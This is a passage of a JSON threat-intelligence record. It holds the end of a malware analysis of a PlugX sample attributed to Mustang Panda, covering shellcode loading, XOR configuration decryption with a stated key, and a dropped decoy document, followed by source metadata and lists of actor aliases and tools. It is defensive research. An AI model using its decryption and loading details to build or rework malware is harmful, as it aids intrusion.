malware\n\n## Through the shellcode analysis above, we see that it simply maps the PlugX Dll into memory and then calls the export function BLMSqofHz. Analyzing this Dll, its configuration is stored in the .data section with a size of 0x460 bytes:\n\n The function that performs configuration decryption uses an xor loop with the length of decryption key is 9:\n\n\n-----\n\n## Dump the encrypted config data to disk, after observing I get the decryption key “jOh752oCI“. Here is the configuration information malware after decrypting:\n\n We can write a Python script to parse information like this:\n\n\n-----\n\n3.5. Extract decoy document\n\n## With the above decryption configuration, we see that the malware when executed will drop and open the decoy document named: Written comments of Hungary.docx to lure the victim. Going back to the LMIGuardianDat_sc.bin file, we find this decoy document starting at offset: 0x8F6C0. Dump the document to disk, we have information about it as follows:\n\n End.\n\n m4n0w4r\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-12-27 - Diving into a PlugX sample of Mustang Panda group.pdf"
    ],
    "report_names": [
        "2022-12-27 - Diving into a PlugX sample of Mustang Panda group.pdf"
    ],
    "threat_actors": [
        {
            "id": "1691c25f-1aa4-4168-8ce2-7aa8f23246e7",
            "created_at": "2024-06-04T02:03:07.724221Z",
            "updated_at": "2025-03-27T02:05:17.284601Z",
            "deleted_at": null,
            "main_name": "BRONZE PRESIDENT",
            "aliases": [
                "Mustang Panda ",
                "Red Lich ",
                "Temp.Hex ",
                "HoneyMyte "
            ],
            "source_name": "Secureworks:BRONZE PRESIDENT",
            "tools": [
                " Cobalt Strike",
                " ORat",
                " PlugX",
                " RCSession",
                "China Chopper"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9baa7519-772a-4862-b412-6f0463691b89",
            "created_at": "2022-10-25T15:50:23.354429Z",
            "updated_at": "2025-03-27T02:00:55.45162Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Mustang Panda",
                "TA416",
                "RedDelta",
                "BRONZE PRESIDENT"
            ],
            "source_name": "MITRE:Mustang Panda",
            "tools": [
                "Cobalt Strike",
                "RCSession",
                "NBTscan",
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2ee03999-5432-4a65-a850-c543b4fefc3d",
            "created_at": "2022-10-25T16:07:23.882813Z",
            "updated_at": "2025-03-27T02:02:10.0116Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Bronze President",
                "Camaro Dragon",
                "Earth Preta",
                "HoneyMyte",
                "Mustang Panda",
                "Operation SMUGX",
                "Operation SmugX",
                "PKPLUG",
                "Red Lich",
                "Stately Taurus",
                "TEMP.Hex"
            ],
            "source_name": "ETDA:Mustang Panda",
            "tools": [
                "9002 RAT",
                "AdFind",
                "Agent.dhwf",
                "Agentemis",
                "CHINACHOPPER",
                "China Chopper",
                "Chymine",
                "ClaimLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "DCSync",
                "DOPLUGS",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Farseer",
                "Gen:Trojan.Heur.PT",
                "HOMEUNIX",
                "Hdump",
                "HenBox",
                "HidraQ",
                "Hodur",
                "Homux",
                "HopperTick",
                "Hydraq",
                "Impacket",
                "Kaba",
                "Korplug",
                "LadonGo",
                "MQsTTang",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "NBTscan",
                "NetSess",
                "Netview",
                "Orat",
                "POISONPLUG.SHADOW",
                "PUBLOAD",
                "PVE Find AD Users",
                "PlugX",
                "Poison Ivy",
                "PowerView",
                "QMAGENT",
                "RCSession",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TONEINS",
                "TONESHELL",
                "TVT",
                "TeamViewer",
                "Thoper",
                "TinyNote",
                "WispRider",
                "WmiExec",
                "XShellGhost",
                "Xamtrav",
                "Zupdax",
                "cobeacon",
                "nbtscan",
                "nmap",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1675303638,
    "ts_updated_at": 1743041807,
    "ts_creation_date": 1675237076,
    "ts_modification_date": 1675237076,
    "files": {
        "pdf": "https://archive.orkl.eu/f5529a2813f540bd74a2c33f1a4302a5c0df35a8.pdf",
        "text": "https://archive.orkl.eu/f5529a2813f540bd74a2c33f1a4302a5c0df35a8.txt",
        "img": "https://archive.orkl.eu/f5529a2813f540bd74a2c33f1a4302a5c0df35a8.jpg"
    }
}